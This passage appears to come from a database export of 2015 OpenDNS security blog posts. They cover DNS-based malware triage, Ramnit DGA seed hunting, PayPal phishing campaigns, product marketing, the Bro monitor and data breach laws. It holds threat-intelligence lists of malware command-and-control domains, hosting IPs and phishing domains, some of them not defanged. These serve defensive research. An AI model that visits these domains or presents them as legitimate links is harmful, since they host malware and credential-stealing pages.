more broadly with the information security community.\nNLPRank is one of several new models currently under development by OpenDNS Security Labs to detect anomalous online activity and malicious attack campaigns. The research team plans to unveil new methods and research in the coming months.', 'Announcements;Blog;Labs Research', 'https://umbrella.cisco.com/blog/2015/03/05/opendns-unveils-nlprank-a-new-model-for-advanced-threat-detection/');

In fact, the dynamic analysis from VirusTotal only shows communication to 134.170.185.211 on UDP port 123 – which is a Microsoft NTP server that the Windows virtual machine likely called out to in order to sync its time.\nThis exact situation illustrates some of the issues with relying entirely on dynamic analysis engines. That being said, we strongly suggest that you try multiple engines/platforms when performing dynamic analysis to see what shakes out. One alternative is The Shadowserver Foundation’s Malwr.com platform. Analyzing the downloaded tv.exe file on Malwr.com (https://malwr.com/analysis/MTY5MTAxZjE3OTk5NGVkZDkyYTFhNGMwZTVjOTBjNzc/#) shows us that several signatures have been trigged.\n\nAs well as interaction with the DGA in question – perviylich[.]ru\n\nAdditionally, we can observe the system level communication flow and the Windows hooks involved in said communication.\n\nNow reversing the malware would have eventually given us this domain but we’re in triage mode right now. We can always reverse the malware later to confirm and/or expand our findings.\nLooking up the perviylich[.]ru domain in OpenDNS Investigate, we can tell several things:\n1) The domain is blocked by OpenDNS\n2) The domain only recently became active\n\n3) The majority of clients requesting the domain are from Australia (80%) – perhaps a targeted attack on a particular region?\n\n4) The threat model identifies this domain as having a high likelihood of being a DGA\n\n5) The domain utilizes the following IP addresses: 193.169.86.178 (also the name server) and 62.76.187.73\n\n6) The IPs are allocated to AS’ in Ukraine and Russia, respectively\n\n\n7) The IP addresses also host a number of other DGA-looking domains\n\n\n8) In looking at some of the other domains on that infrastructure, we can see a similar pattern across the entire hosting IP addresses\n9) We can also see a pattern emerge that shows pairings of DGA registrations utilizing the same domain name combined with both a .ru (Russia) TLD and a .su(Soviet Union) TLD.\n\n10) Using this information, we can create a master list of domains involved in this particular malware infrastructure run:\ncvelasiren[.]ru\ncvelasiren[.]su\ndobriytsar[.]ru\ndobriytsar[.]su\ndobroeutro[.]su\neplayavodka[.]ru\ngromkiyzvuk[.]ru\ngromkiyzvuk[.]su\nholodnoepivo[.]su\nhoroshiyden[.]ru\nhoroshiyden[.]su\nkorichneviyrassvet[.]ru\nkorichneviyrassvet[.]su\nkrepkiystul[.]ru\nkrepkiystul[.]su\nkrugovayaporuka[.]ru\nkrugovayaporuka[.]su\nlasiren[.]su\nletniydozhd[.]ru\nletniydozhd[.]su\nnogaknoge[.]ru\nnogaknoge[.]su\nperviyclass[.]su\nperviylich[.]ru\nperviylich[.]su\nperviysneg[.]ru\nperviysneg[.]su\npodliyvrag[.]ru\npodliyvrag[.]su\nrozoviyzakat[.]ru\nrozoviyzakat[.]su\nshumelkamish[.]ru\nshumelkamish[.]su\nsilniygrom[.]ru\nsilniygrom[.]su\ntechetreka[.]ru\ntechetreka[.]su\ntemnayanoch[.]ru\ntemnayanoch[.]su\ntemniyles[.]ru\ntemniyles[.]su\nteplayavodka[.]ru\nteplayavodka[.]su\ntihiyshepot[.]ru\ntihiyshepot[.]su\ntomniyvecher[.]ru\ntomniyvecher[.]su\ntruhlyaviypen[.]ru\ntruhlyaviypen[.]su\ntrusliviyzayac[.]ru\ntrusliviyzayac[.]su\nutliycheln[.]ru\nutliycheln[.]su\n\nIf you’re a visual person, you can also graph the domains, using the OpenDNS Investigate API and the open source OpenGraphiti tool, to show the linkages. The image below shows the domains (outside edge of circle) and how they’re associated with the two IP addresses found earlier in this post.\n\nTo confirm findings, however, you can (and probably should) analyze the memory of the running binary to ensure that there are no subsequent IP addresses or domains called out to that may have been missed by your dynamic analysis engines. In this particular case, there were no additional domains or IP addresses.\n11) Digging even further into the domain list, we can query Investigate for any IP addresses these domains resolved to in the past\nPlacing the domains into Maltego and using OpenDNS’s Investigate transform, we found two IP addresses these domains resolved to.

This confirms the whois records.\n\n14) It should be noted that AS48031 is a rogue AS that has been serving malicious sites for a while in addition to performing various evasive actions.\nWe’ve been monitoring it for a while and discussed it in March 2014 in this webcast (minute 19:25 in “Rogue and Stealth ASNs”) and at Virus Bulletin here.\nAS48031, XSERVER-IP-NETWORK-AS PE Ivanov Vitaliy Sergeevich,UA, that a lot of security folks will recognize has been hosting all kinds of malicious and shady content (malware, browser-based ransomware, porn sites, spam, radical forums) and it’s been “fluxing” on and off the routable IP space. For example, in earlier 2014, it disappeared off the global routing table but as of early March 2015, AS48031 is online and advertising its prefixes by verifying our BGP routing tables and as shown below.\n\nAt the time of this writing, there are 1900+ live IPs on AS48031 IP space, and further checking them reveals finer granularity of allocation. A few suspicious small hosters are selling this sub-allocated IP space for customers via VPS, VDS, and dedicated servers. justhost.in.ua is one of these hosters that warrants further scrutiny. We discussed similar rogue or abused small hosting providers in our recent talks at BlackHat, DefCon and Virus Bulletin.\n\n\nWe wouldn’t be surprised to see a few domains start using dns-pupkin-vasya.com as an authoritative zone very soon and can with confidence, say they are domains you don’t want your devices connecting to.\nAt this point you should have a good idea of how to leverage OpenDNS Investigate to perform detailed malware triage and infrastructure investigations to protect your organization and its users – all without having to open a hex editor or manual debugger.\nUntil next time!', 'Incident Response;Malware;Security Research', 'https://umbrella.cisco.com/blog/2015/03/04/investigating-a-malicious-attachment-without-reversing/');

I am proud to report on the experiences of two of our customers who recently deployed OpenDNS’s Umbrella product. From a high level they both experienced dramatically lowered malware activity and more insight into bad actors on their network after deploying OpenDNS.\nBoth accounts reflect the way most companies operate today, with employees accessing the network on mobile devices, from remote or home offices and anywhere in between (like Starbucks or an airport lobby). Their insight also demonstrates how cloud-delivered security provides seamless, timely and more effective security protection for end users.The first, Hamamatsu, is a Japanese manufacturer of optical sensor technologies. The company’s predominantly mobile U.S. workforce is spread across the country, from their headquarters in Bridgewater, N.J., to offices in San Jose, Chicago, Denver and San Diego. The company was struggling to keep its network of users free of malware. Their existing defenses lacked the visibility into network traffic that was necessary to remediate infected devices. Since deploying OpenDNS, Jim Hnasko, network manager of operations, estimates that their network has gone from having 20 percent of their machines infected with malware to less than one percent. Hnasko described the improved security and operational efficiency gains from deploying OpenDNS in this way: “Being able to show [my CEO] where we were before OpenDNS and where we are now, it’s night and day.”\nAnother company, civil engineering firm Pennoni Associates, Inc., employs nearly 1,000 individuals, many of whom serve clients through multiple remote offices and field assignments. Before OpenDNS, Pennoni used a Websense gateway appliance installed at its headquarters to protect both on-network and off-network workers. Jim Slora, the company’s senior systems administrator, said that this solution was causing latency and downtime for its regional offices. What’s worse, the team didn’t have enough visibility to identify the malware-infected machines that were already on their network.\nSwitching to OpenDNS has eliminated the strain on Pennoni’s network and support team. According to Slora, “The company can now apply the same protection in the field as it does in the office, malware infections have been reduced from three to four infections per day to one every few days. The reduction in infections saved us close to one full-time help desk tech.”\nWhile our goal is to keep our customers’ networks secure, no matter where, when and how employees access them – we also want to ensure that we have unmatched customer satisfaction.

Without DNS, the internet would be on “hard-mode” all the time. It would be like the days before speed-dial when you had to actually REMEMBER everyone’s phone number like some sort of Einstein-esque genius. Have you ever lost your phone before and tried to call someone? It’s hard. I seriously should have gotten a Nobel Prize for knowing all of my best friends’ phone numbers by heart back in the day, but I digress.\nWhat DNS essentially does is map domain names to IP addresses, as the IP’s are what’s actually used to connect you to the website itself. URL’s are basically just shortcuts that are designed to make it easier to surf the internet. But how does that work? Well it’s magic. Plain and simple (don’t worry, I promise this answer will hold up in any job interview but only if you smug up your face while you say it).\nAll joking aside, it is pretty magical but it’s not supernatural by any means. Check it out.\nLet’s start with your computer, represented by this little guy right here.\n\nFor example purposes, lets say you wanted to visit Facebook. You’d open up a browser and type “facebook.com“ into the url field. This is where the magic happens. Your computer then sends a request to the local DNS server.\n\nThe DNS server acts sort of like a phone directory. It receives your “facebook.com“ request, retrieves the IP address for that domain, and then sends it right back to your computer.\n\nNow that your computer has the IP, it knows the way to San Jose (shouts out to Dionne Warwick). It takes that IP and uses it to connect you to “facebook.com“ where you are free to view advertisements, post pictures of just your face that you took yourself, “like” pictures of other people’s faces that they took themselves, etc.\n\nThere are other variables and whatnots that can complicate this “connecting to a website” process depending on the situation, but if we were to boil it all down simply, this is about what it would look like.\n\nI know I’m not the greatest artist, but that’s beside the point.\nLooking at it from an overhead view like this really outlines the importance of having DNS security implemented on your network. If that DNS server in the diagram were OpenDNS, then you could see how we would be positioned in such a way that could potentially keep your computer from ever coming in contact with infected domains! Or, even better yet, if you didn’t want people visiting “facebook.com“ on your network, you could use OpenDNS to prohibit that from happening too!\nSo there you have it.

What also surprised me was the variety and complexity around how customer success is defined and measured by different organizations.\nOne of my first initiatives at OpenDNS was to clearly define the measure of our customer success operation in a way that was easily digestible to our investors, our employees, and most importantly, to our customers. Toward this end, I created a very focused mission for the entire company: to build customer C.A.R.E.\nThe acronym and concept resonated well with many of the CCOs in attendance, so I thought I’d share it with you, our valued customers, too.\nAt the very heart of it, the value OpenDNS brings to customers is measured by how we C.A.R.E. The acronym stands for four key performance indicators: Customer satisfaction, Adoption, Retention, and Expansion.\nCustomer Satisfaction\nWe use two scores to measure customer satisfaction. The first score is the percentage of customers who feel positively about their experience with our support team. After a customer support representative changes a customer ticket to ‘solved,’ the customer receives an email simply asking if their experience was good or bad. I’m happy to report that last month, 97% of enterprise customers who took the survey reported that they had a positive experience with OpenDNS support. The second score we use to measure customer satisfaction is the net promoter score (NPS). Assessing these scores together gives us clear insight into the support our customers are receiving, as well as as the overall customer experience.\nAdoption\nWhile adoption may seem like a self-explanatory measure, we consider it an important key indicator beyond just simply the percentage of customers we have successfully onboarded.  Adoption is really our pulse check. We want to know that our customers are getting time to value and that we’re proactive in helping them maximize their OpenDNS investment.\nRetention\nWe are fortunate to have very healthy customer retention rates relative to industry standards.  Nevertheless, subscription renewals are one of the loudest ways customers can vote on our value—and we sincerely appreciate your business.\nExpansion\nThe uptake of our platform’s new security features has been incredibly strong as customers learn more about these services.\nAt OpenDNS, we C.A.R.E.\nWe firmly believe that customer success is part of every employee’s job description.

Our Roaming Client product allows you to work safely off-network—at coffee shops, airports, or anywhere else you might take your laptop.\nHow Does the Roaming Client Work?\nThe Roaming Client works by securely directing DNS queries bound for the Internet to the OpenDNS global infrastructure. This process happens via one of the OpenDNS Global Network data centers distributed worldwide.\nThe Roaming Client allows granular filtering and reporting. These capabilities enable our customers to quickly and easily detect computers infected with malware by identifying which computers might be affected. This detection is not done easily with basic network security coverage from on-premise solutions.\nThe Roaming Client Utilizes Nearly Zero System Resources\nUnlike an application that grows in size as it stores data, the Roaming Client doesn’t save information and therefore doesn’t add network or system latency. OpenDNS Technical Support Engineer Zack Gilman said, “The Roaming Client does not cache DNS in any way, or expand in size or footprint over the course of time. By design, DNS uses very few resources, and this is also true with the Roaming Client and with the Umbrella service. The vast majority of computational power is held within our cloud, not on the local machine.”\nOpenDNS Product Manager Scott Cressman further explains, “It exists solely to get the DNS traffic to our service with the right context of from whom and where it’s coming. All the heavy lifting is done in the cloud.”\nThe Roaming Client is Easy to Deploy and Simple to Manage\nYou can deploy the Roaming Client using Active Directory, Apple Remote Desktop, or your preferred remote management tool. Often the end user doesn’t realize that the Roaming Client has been installed, as it requires no user intervention.\n\nHamamatsu, a Japanese manufacturer that uses OpenDNS for network visibility and security for its U.S. offices, has installed the Roaming Client on more than 200 employee laptops. In a recent CSO article, Jim Hnasko, Hamamatsu’s Network Manager of Operations, explains, “When we deployed the agent, we expected users to complain that things were slower. We didn’t have any complaints. It was almost seamless.” In addition to an easy deployment and a solution that doesn’t add latency, Hnasko adds, “We can get reports on how many infections we have, if any, and who has them, so we can remediate the issue. We’re now proactive instead of being reactive.”\nEmployee Privacy with the Roaming Client\nMany IT administrators struggle with being perceived as ‘Big Brother’ when their goal is simply to protect users wherever they are. Your organization can tailor a Roaming Client policy to protect employee privacy; for example, establishing a location-based policy for employees once they’re off-network, and choosing not to log non-security events, therefore maintaining off-network privacy.\nOpenDNS CEO David Ulevitch explains, “A customer’s policy for their employees might be different when the employee is in the office versus when they’re out of the office. When they’re in the office, it could block all security threats and log all their websites. When they’re at home, it can be configured to only block security threats and doesn’t log what websites they visit.” Utilizing various policies for different scenarios is an easy way to both protect employee privacy as well as to fully secure devices no matter where they’re being used.\nSupport is Easy With the Roaming Client\nThe Roaming Client has remote logging and diagnostic features built in, enabling our support team to troubleshoot complex issues without end-user involvement in many cases.\nThe Roaming Client is a quick and easy way to ensure that your end users are protected wherever they choose to work.

Last week, OpenDNS hosted the inaugural Bro4Pros workshop, an in-depth two-day event featuring advanced user sessions. These sessions were given by the people who know Bro best, including several members of the organization’s development team and researchers from around the country.\n\nAlthough you may not have heard the name previously, the Bro platform has been around for some time—it celebrates its 20th anniversary this year. The platform itself is the product of a small group of intensely dedicated developers and researchers building on the initial design by Vern Paxson, who now leads Bro’s continuous development along with Robin Sommer.\n“We had never planned to do a workshop like this,” said Seth Hall, a research engineer at the International Computer Science Institute and one of Bro’s core developers. “A few years ago, there weren’t enough people using Bro at a high enough level to do something like this. But everyone who runs Bro is crazy about it—that’s one of the reasons it’s fun to work on, and that’s why the community eventually grew enough for us to put on this workshop.”\nOne of the major reasons for Bro’s success is funding from the National Science Foundation in the form of two research grants. The awards, which were given to further research and projects developing Bro, will help keep the platform’s creators going through 2016.\nDespite the limited resources, the team has managed to build a powerhouse tool that sees use with security teams in several industries, from corporations to universities to government offices. “There’s no other open source product—or even commercial product—that does what Bro does,” said Hall. “We’ve even seen people rip out commercial products to run Bro.”\nSound intriguing? Below, you’ll find a quick primer to get you up to speed on Bro, often considered the best kept secret in security:\nEverything to Know About Bro (Well, Almost.)\nCheekily named after “big brother”, Bro is an open source network monitoring framework that can help a network operator identify malicious or suspicious events in network traffic. “At an extremely high level, Bro can be described as network traffic in, database out,” said Hall. “The data is well organized—not like a log file. It’s easy to parse out the information and work with it.”\nAccording to Paxson’s introductory paper, Bro: A System for Detecting Network Intruders in Real-Time, “Bro is divided into an “event engine” that reduces a kernel-filtered network traffic stream into a series of higher-level events, and a “policy script interpreter” that interprets event handlers written in a specialized language used to express a site’s security policy. Event handlers can update state information, synthesize new events, record information to disk, and generate real-time notifications via syslog.”\nWhile the basic Bro platform is comprehensive, it is also programmable, allowing network operators to include additional scripts which customizes and extends the capabilities of the program. This flexibility allows Bro to be folded into almost any security stack—and as mentioned earlier,  it’s already used operationally at large organizations around the world.\nBro Benefits\nOne of Bro’s biggest value-adds is the amount of data it logs, allowing network operators to identify threats rapidly. “Nothing else gives [security practitioners] structured data on what sites are visited, what emails are sent, and what SSH connections are happening—Bro is a rich data source,” Hall said.\nThe best part? All data processed in Bro is coming from your network—an accessible resource everyone has. “Eventually, the Big Data community will catch on to Bro,” Hall predicted. “It has deep, flexible logging, and puts out so much data you won’t even know what to do with it!”\nThe other benefit of using Bro in your environment is the visibility it provides—an essential element for securing a network. According to Hall, “Visibility is the only defense you can have. It’s the last line of defense because not everything is known—sometimes you have to hunt and find malicious activity. That’s why most people learn Bro, because having visibility is key. As security practitioners, we have to know what’s going on, and then we can respond.”\nWant to Give Bro a Try?\nInitially, Bro may seem intimidating, but there are a wealth of resources available to network operators who are just starting out. The official Bro website is a great place to start, as is GitHub. As evidenced by this workshop, the wider Bro community is thriving, and offers many different options for connecting to Bro experts all over the world.', 'Blog;Community;Events;Security 101', 'https://umbrella.cisco.com/blog/2015/02/24/growing-interest-in-bro-helps-security-professionals-watch-over-their-networks/');

In this blog, I’ll discuss how we discovered new malicious domains from a well known malware family.\nMany DGAs work by feeding a date into a mathematical function to generate a string of characters. Typically, a TLD is then appended to the end of the string, thus forming domain name. This domain name is then contacted for instructions. If the domain name does not resolve to an IP address or the domain does not respond with instructions, the process is repeated. This is a common method of obscuring the command and control servers a malware uses.\nMore DGAs\nDhia Mahjoub, Steve Mckinney, and I recently presented our findings from tracking the new Gameover Zeus botnet at ISOI. The newGOZ implants used this DGA technique and introduced salts (a.k.a. magic numbers) to the function for added complexity. Two known salts were found in newGOZ binaries, and Steve, a security researcher at Cisco, suggested the idea of brute forcing the salt space in an attempt to identify additional salts.\nDomain generation algorithms aren’t a new concept. Neither is the Ramnit family of malware. Recently, Johannes Bader published the function Ramnit uses to generate its command and control domains. An interesting characteristic about the algorithm Ramnit uses is that it does not include a date or timestamp as input to the generation algorithm it uses. This means that, unlike many other malware families that make use of DGAs, Ramnit does not generate a new set of domains depending on the date. In contrast to the newGOZ DGA, Ramnit’s domain generation pattern is not periodic. Below is a picture of the DNS query volume we saw for one of the newGOZ command and control domains:\n\nThe newGOZ algorithm uses the current date as input to its DGA. This causes newGOZ to generate a new set of domains each day. Each domain in the set of domains generated for a particular day has a similar query volume pattern to the above graph. Below is a picture of the query volumes OpenDNS has seen for a Ramnit command and control domain:\n\nMath Fights Math\nTaking the algorithm implementation from Bader’s blog, the following steps were taken:\nThe number of domains to generate was statistically set to one\nA Python generator was added to loop over the seed space (from 0x00000000 through 0xFFFFFFFF)\nThe first domain Ramnit would contact for a seed is calculated\nThe domain from step three was queried against OpenDNS’s resolver logs at a random hour from a random recent day\n\nThis determines if OpenDNS has received queries for this domain\nIf no queries have been seen the domain is ignored and the next seed from step two is used in step three\n\n\nIf we have seen queries for the domain name the seed from step two is set aside for further processing\nOnce a batch of possible seeds is identified, we calculate the first 500 domains the DGA using each seed would produce\nWe observe the query volumes for those 500 domains over the last week\n\nThis step validates the findings by using client queries\nThis step identifies potential false positives (the Ramnit DGA does collide with legitimate domain names)\nThis step determines the size of the set of domains for each seed is (different seeds do, in fact, generate different domain set sizes)\n\n\nEach seed and its count of domains to generate is recorded\nThese steps are continued until the seed space in step two is exhausted\nDue to the first step of randomly selecting a query hour for the first domain generated from each seed, this method has potential false negatives. It does, however, identify a minimum number of seeds in use by Ramnit binaries. Unfortunately, our current system needs optimizations. Out of the approximately 4 billion possible seeds, we’ve only generated and inspected about three percent. Fortunately, this system has been able to identify a few thousand Ramnit command and control domains we were not previously blocking.\nClients Querying These Domains\nOne interesting note about the client queries for the Ramnit command and control domains identified this way is that many of the client IP addresses querying for these domains are geographically concentrated in only a few countries (GB, AU, IE, and US) and many of the IP addresses query for domains generated by multiple seeds. Explanations for this pattern in client queries include:\na single Ramnit implant is using multiple seeds\nmultiple Ramnit infections behind a single public IP address are using different seeds\nmalware sandboxes detonating Ramnit samples are using OpenDNS’s resolvers\nFuture work for this research includes parallelization to speed up the brute forcing of seed space, generalizing the system for use with other malware families’ DGAs, and further exploring the behavior of compromised clients.', 'Malware;Security Research;Threat Discovery', 'https://umbrella.cisco.com/blog/2015/02/18/at-high-noon-algorithms-do-battle/');

The VA provides a higher level of reporting granularity by providing insight inside your network through functionalities such as active directory (AD) integration or domain/IP routing.\nWhy Do I Need Two?\nTo fully protect customers from vulnerabilities, security service providers like OpenDNS use VAs to update their services. To receive these updates automatically, we strongly recommend that all of our customers install two VAs.\nCustomers with a single VA installed will not receive automatic updates, as it would cause downtime. Having two VAs installed means one install can continue running while the other automatically updates. OpenDNS Engineering Manager Justin Swift explains, “The main benefit of having a second VA is for redundancy; in the event that there is a problem with the primary DNS server, the secondary server keeps end users from experiencing downtime. This is particularly important when considering updates. Customers with redundant VAs can be sure they’ll always have the most up-to-date version of the VA, without needing to worry about scheduling downtime.”\nWith a single VA, a customer needs to stay on top of new VA releases and apply updates manually.\nBasically, we want to do the work for you, and when you install a second VA, we can.\nWhy does it matter?\nThe recent GHOST exploit is an example where OpenDNS took extreme precaution by updating the VA software to prevent any future attacks. We were unable to automatically deliver updates for this vulnerability to customers with only a single VA deployed.\nWorried that installing multiple VAs might take too long?\nOpenDNS has been working on new features to save our customers time when installing multiple VAs. In the past, in order to set up a new VA, a customer would need to enter a list of all internal domains that should go to the local resolver. According to OpenDNS Product Manager James Brown, “To set up a second VA, the customer would need to type this list twice. Installing 20 VAs would require typing the list 20 times, as there were no copy and paste shortcuts to this process.”\nWith our new Internal Domains feature, we give you the ability to manage all of your VA internal domains without having to access each and every one to make changes. We’ve taken this manual process and added domain management to your OpenDNS dashboard. Now it’s even easier to install multiple VAs, and you can learn exactly how to get the feature here.\nRegardless of how many VAs you have deployed, we recommend that customers subscribe to the Umbrella Release Notes section of OpenDNS’s Support Portal to receive an email notification whenever new updates become available. For VA setup instructions, see the video below:\n\nFor information on setting up a second VA for Umbrella, find the OpenDNS setup guide here. You can also use the Upgrade VA button in the dashboard to force the update on your current VA. With a single VA deployed, the update will require approximately 20 minutes of downtime.', 'Blog;Security 101;Umbrella', 'https://umbrella.cisco.com/blog/2015/02/17/importance-installing-two-virtual-appliances/');

The general idea behind a phishing attack is to entice a victim into clicking a link, much like a fisherman attempts to catch a fish with a lure on a hook. Once a victim falls for this and clicks a link in a phishing email, they may be directed to a seemingly legitimate website where they are prompted for information or to download malicious software.\nWhile the majority of phishing attacks are not personalized and are sent to as many potential victims as possible, targeted phishing also occurs. Targeted phishing uses known information about a recipient to better convince them into providing credentials. A well-crafted targeted phishing attack can defeat even the best security controls if an attacker is able to collect highly-privileged login credentials.\nTo better understand how phishing attacks are conducted and how they sometimes convince end-users to type credentials into legitimate-looking websites, we will walk through some recent examples of advanced phishing attacks seen by OpenDNS Labs.\n\nDetails\nOn January 26th at 11:15pm UTC, OpenDNS Security Labs detected multiple domains created to impersonate a Paypal website for use in an email phishing campaign and personal information harvesting.\nOne of the primary websites (redirectly-paypal[.]com) was registered on January 25th, 2015 through Wix.com based on nameserver information (or possibly registered at Network Solutions, Inc. and then transferred to Wix.com’s nameservers). One of the fraudulent domains (security-paypal-center[.]com), which has been dormant since its expiration in 2005, was re-registered January 22nd, 2015 – again through Wix.com. We also found a few other Paypal related spoofing domains that we display below: x-paypal.com, securitycheck-paypal.com, paypalinspection.com, area-paypai.es, and many more (not shown).\nBased on the auto generated privacy email within the registrant’s WHOIS information (Figure 1), we can ascertain that both domains were registered at the same time – likely on the same transaction.\nFigure 1 – WHOIS Information for Both Domains\n\nThe fraudulent Paypal websites (Figures 2, 4, 5, 6, and 7) are virtually indistinguishable from the legitimate PayPal.com site (Figure 3).\nFigure 2 – Fake Site\n\nIn fact, the fraudulent site borrows much of its image, text, and color scheme from the real site.\nFigure 3 – Real Site\nDuring the writing of this post, a fraudulent site was discovered that looked like a perfect clone of the legitimate PayPal.com site – but using an unusual domain: x-paypal[.]com.\nFigure 4 – A Fake Site\nIn this image, we see attention to detail in presentation, but with the odd domain name, x-paypal[.]com. An untrained observer might not notice and actually follow through with entering credentials.\nWe saw that this was registered with ENOM INC., a registrar that consistently came up when investigating these typo-squatting domains:\n\nThe next image is an example of a slightly more sophisticated attack, in which the attackers copied HTML code directly from the legitimate PayPal[.]com in order to set up their own realistic phishing website. Additionally, the domain, securitycheck-paypal[.]com might lead a less observant user to avoid questioning its legitimacy.\nFigure 5 – Another Fake Site\n\nFigure 6 – Another Fake Site\nThe following phishing attempt is spoofing an Apple ID Verification page at the domain paypalinspection[.]com. While the services that PayPal and Apple offer are unrelated, it’s possible the the unobservant user could fall for this and enter their Apple ID credentials.\n\nFigure 7 – Another Fake Site\nIn following attempt, there is less attention to detail in the replication of the PayPal login page. It uses some original content pulled from actual PayPal servers, but is in Spanish while being sent to English-speakers. Additionally, the domain, area-paypal[.]es is fairly far-removed from paypal[.]com. A potential victim of this phishing attempt would hopefully notice something isn’t right before continuing.\n\nOpenDNS Investigate Observations\nThe following information was surfaced by our OpenDNS Investigate product and shows the global query traffic, registrant, and IP information for the aforementioned domains:\nredirectly-paypal.com\n\nsecurity-paypal-center[.]com\n\nBoth domains are hosted with CyrusOne LLC (http://www.cyrusone.com/), a provider of global datacenter facilities for colocation of servers. The company boasts customers such as CarFax.com, Dell, Enbridge Energy Company Inc., and Rent-A-Center. A quick look at the Autonomous System (AS) number associated with CyrusOne (AS20013) shows a number of similarly fraudulent PayPal-related domains. Some examples include:\nhelpcenter-paypal-rosolution[.]pepitoheyashi[.]ga\npaiiypal[.]com\npaypal-secure-account-information[.]reikitrainingjourney[.]com\npaypal[.]com[.]user[.]accounts[.]lwproductions[.]net\npaypalcomcgibinwebscrcmdloginsubmitdispatch58z8duft875dl80al[.]planetevents[.]co[.]in\npaypalupdate[.]uploadppl[.]com\npaypaluserupdateinfoforupaypalnowclosedbypaypal[.]bodybuildingexercise[.]org\nupdate[.]paypal[.]com[.]kgreendesigns[.]co[.]za\nwww[.]paypal[.]com-webapps-cgi-bin-webscr-login-access[.]com\nOpenDNS has reported these domains to PayPal. We have received confirmation that its fraud and abuse department is currently investigating and working to take them down. In the meantime, OpenDNS has blocked access to these domains for all users of our DNS infrastructure.\nFraudulent Phish Workflow\n\n\nThese attacks are not new, but they are beginning to look more legitimate with every iteration. Companies like Wix.com make it trivial to create a professional looking site these days – and the attackers have noticed. All users should remain diligent when surfing the Internet, clicking on links in emails, and opening attachments. The difficulty of identifying the validity of these websites visually will soon be untenable.\nDetection\nOpenDNS Security Labs specializes in developing anomaly detection models to identify different types of attacks. For this particular algorithm we utilized natural language processing techniques such as a fuzzy substring matching, and a modified Levenshtein distance to check for the word distance between legitimate and typosquatting domains (ex. malware.com vs. rnalware.com, linkedin.com vs. 1inkedin.net, ). We also leveraged SecurityGraph’s vast amount of data to investigate different types of attacks in our user’s DNS data. For example, we built up an ASN map of all legit domains mapping to their appropriate ASNs (ex. Google->ASN 36492 ).\nThis idea was previously outlined in the DarkHotel blog. In addition we mined these adversarial domains’ WHOIS records to extract patterns. When registering a domain on internet, registrants typically have to provide information about the entity registering the domain. One of the ways we are able to track these adversary syndicates is mining their WHOIS records for patterns. Searching the WHOIS database for registrant information among these domains, a common denominator that was noticed was the use of Perfect Privacy, LLC.\nUsing privacy protection is nothing new, yet does add another layer of obfuscation. The use of this particular privacy provider accounted for a majority of the more sophisticated sites that were identified, leading to the theory the same actor(s) were involved in the production of these sites. We also found that many of these domains were created/registered very recently, some within the past couple days, most within the couple months.\nRecommendations\nSome of the indicators to look out for to make sure you don’t fall victim to this type of attack is to verify that the site is using HTTPS and a legitimate SSL Certificate from the organization you are visiting. All of the spoofed sites we saw served their content over HTTP, which is highly uncommon for money transfer sites.\nOther items to notice are variations in the layout from the legitimate site. The original phishing email could also provide clues as to its authenticity. If the wording is off or it’s blatantly asking for you to enter your password somewhere, it could be phishing. A more advance user may want to review the headers of an email, tracing the path to determine if it was spoofed to look as if it is coming from another location.', 'Security Research;Threat Discovery', 'https://umbrella.cisco.com/blog/2015/02/11/paypal-phishing-sophistication-growing/');

His conclusion? “Investigate is a must-have for your threat analysis toolkit.” He went on to say, “Our technique of pivoting off of the suspect domain to uncover a potentially malicious architecture is greatly enhanced by Investigate. It provides the context for a solid analysis of a potential threat.”\nYou can read Peter’s full review at SCMagagine.com.', 'Blog;Labs Research;Umbrella', 'https://umbrella.cisco.com/blog/2015/02/11/window-connected-world-opendns-investigate/');

In an article on cybersecurity regulation posted last fall, Inserra and Rosenzweig pointed out that the government itself also was hit with its own less publicized cybersecurity breaches and failures – 23 separate incidents across several different agencies in 2013 and 2014.\n\nFast forward and following this year’s State of the Union address, President Obama in fact did outline new legislation that will determine when and how consumers and businesses are informed about data breaches that expose their personally identifiable information (PII). As recent as last week, two more bills covering data breach notification were reintroduced into the House and Senate. In both cases, the federal legislation would replace what was described as a “patchwork” of existing state data breach notification laws.\nNow that the cards are falling where they may, what do businesses need to know about this proposed legislation?\nProposed Federal Laws: How They Could Impact Your Business\nThe proposed legislation’s effectiveness is debatable, as well as the potential impact on consumer privacy. But as a practical matter, what do these laws mean for your business? Below, we’ve summarized several analyses and commentaries on the proposed legislation, collected over the past two weeks.\nWould every company be affected by the proposed bill?\nThe proposed legislation would not affect non-government contracted businesses that collect records on less than 10,000 individuals in the course of a year.\nAlso, if your company stores health care information, you are already subject to The Health Insurance Portability and Accountability Act (HIPAA) Privacy Rule and other rules that govern health records. However, several states’ attorneys general have said companies that hold health care information not currently under HIPAA would no longer be affected by state data breach laws that currently dictate a notification timeline.\nHow will notification laws change?\nThe proposed legislation provides for a 30 day window for notification to consumers. One major change, however, is the law also requires businesses to notify the media when a breach exposes the PII for more than 5,000 individuals.\nHow would this affect my work as a security professional?\nThe proposed federal law allows for a risk assessment to prove that, despite data theft or loss, “there is no reasonable risk that a security risk has resulted in, or will result in, harm to the individuals whose sensitive personally identifiable information was subject to the security breach.”\nExisting State Laws: Preparing for the Worst Case Scenario\nThe 2014 Verizon Data Breach Investigation Report (DBIR) lists over 1,367 confirmed data breaches over a one-year period. Any company operating in multiple states would have to navigate dozens of wildly different laws to determine when, why, and if customers should be notified. Additionally, dozens of legal websites summarize data breach notification laws state-by-state (here’s one example). These sites can give you a starting point to understanding existing laws, but they’re no substitute for actual legal counsel.\nTo put the issue into perspective, this Bureau of National Affairs article outlines the dizzying variety of “personally-identifiable information” as defined in state law–some states include insurance information, others biometric data, and still others include login credentials and passwords.\nTom Hash, director of security engineering at OpenDNS, concurs that these laws can be very difficult for security experts to track. “[Security professionals] are faced with 47 different state laws that can change when they’re not paying attention,” he said. “In some cases, the companies I talk to end up having to figure out their notification guidelines under these laws after the breach has happened.”\nMany security professionals already plan for the worst possible scenario. This means assuming they will have to respond in the tightest notification time-frame (Connecticut’s five days to notify regulators or Maine’s seven days to notify consumers) and under the most stringent definition of PII provided in any applicable state law. Professionals should also account for special circumstances, like California, where the law applies to any company storing a state citizen’s data, even if the business does not operate within that state.\nThe Bottom Line\nWhile the Personal Data Notification & Protection Act is not yet actual law, it is imperative that companies prepare for it or another law that may be very similar.\nSuch preparation requires a huge collaborative effort between your company’s IT department, security team, marketing team, and legal counsel. It is a good idea to lay out an internal and external communication and action plan, and put those plans into practice.\nYou may also want to look into your state government’s recommendations. For example, California’s Office of the Attorney General has a list of best practices and recommendations here.', 'Blog;Security 101', 'https://umbrella.cisco.com/blog/2015/02/09/data-breach-laws-security-professionals-need-know/');

